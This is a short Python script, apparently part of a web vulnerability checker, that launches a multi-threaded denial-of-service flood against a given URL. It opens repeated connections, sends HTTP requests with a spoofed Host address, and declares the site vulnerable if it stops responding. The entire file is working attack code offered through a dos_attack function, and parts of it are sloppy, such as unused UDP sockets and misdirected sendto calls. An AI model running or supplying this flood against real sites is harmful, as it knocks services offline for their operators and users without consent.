import socket, threading, time, random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

fake_ip = '182.21.20.32'
default_port = 80

attack_num = 0
failed_requests = 0

is_vulnable = False
message = ""

testDone = False

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def sendRequest():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (fake_ip, port))
        s.close()
        return True
    except ConnectionRefusedError:
        print("Connection refused")
        return False


def attack():
    while True:
        try:
            sendRequest()
            global attack_num
            attack_num += 1
        except BrokenPipeError:
            print("BrokenPipeError")    
        except TimeoutError:
            global failed_requests 
            failed_requests += 1
            break

def execute_attack(target, target_port):
    global message
    message = "The web is working ok"
    global host 
    host = target
    global port 
    port = target_port if target_port is not None else default_port
    print("DOS attack host: " + host + ", port: " + str(port))
    
    if sendRequest() == False:
        print("The web page is probably not working")
        message = "The web page is probably not working"
        return is_vulnable, message

    for i in range(100):
        try:
            thread = threading.Thread(target=attack)
            thread.start()
        except BrokenPipeError:
            print(str(i) + " thread broken")


    while True:
        time.sleep(1)
        global failed_requests
        if failed_requests > 10:
            print(str(failed_requests) + " requested failed")
            break

    try:
        # Let's try again if page works...
        sendRequest()
    except TimeoutError:
        print("Attacked succeeded!")
        message = "Attacked succeeded!"
        is_vulnable = True
        return is_vulnable, message

def dos_attack(url):
    try:
        port = int(url.split(":")[2][0:4])
        address = url.split(":")[1][2:]
        return execute_attack(address, port)
    except:
        return None, "It seems that you have tricked the program. \"Good job.\""
    

